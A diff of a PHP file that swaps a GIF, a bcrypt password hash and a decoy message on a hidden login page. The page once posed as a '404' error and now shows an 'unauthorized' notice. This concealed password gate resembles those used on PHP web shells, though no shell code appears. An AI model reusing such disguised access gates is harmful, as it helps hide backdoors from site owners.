@@ -93,12 +93,12 @@ function show_login_page()
 
         <!-- GIPHY Image -->
         <div class="gif-container">
-            <img src="https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExM2lzb2pkMGxvOGpybzdmZzJidDF0NTV4ODhjcHdieTF4bTl1YTd5dCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/C4NdKtRaQE9m8/giphy.gif" height="220" width="350"/>
+            <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExY3V6eHZ6Z2pwbTI3bncxbnNuejUzM2dmbHZnam9kMm15Zzc5emZtZCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/sOzHwf1DF8h96A5tXU/giphy.gif" height="220" width="350"/>
         </div>
 
         <!-- Message: Sorry This System now 404 -->
         <div class="message-container">
-            <p><font face="courier" size="5" color="red">Sorry</font><font face="courier" size="5" color="silver"> This System now 404</font></p>
+            <p><font face="courier" size="5" color="red">Admin:</font><font face="courier" size="5" color="silver"> You are not authorized to access this page.</font></p>
         </div>
     </body>
     </html>
@@ -109,7 +109,7 @@ function show_login_page()
 // Check if the user is authenticated, if not, show the login page
 if (!isset($_SESSION['authenticated'])) {
     // Example of a hashed password (replace this with your own hashed password)
-    $stored_hashed_password = '$2a$12$SNywmMsjuSZ650NyvWTLfusV7qSyZ2mXxSJlH7eI4y8v68bcwn5tO'; // Replace with your actual hashed password
+    $stored_hashed_password = '$2a$12$VIHsPPjDg0O385NguowQ0.zLHdnFKFZh5c2msn8ypSBJC8S7u4w.S'; // Replace with your actual hashed password
 
     // If the form is submitted and the password matches the stored hashed password, authenticate
     if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
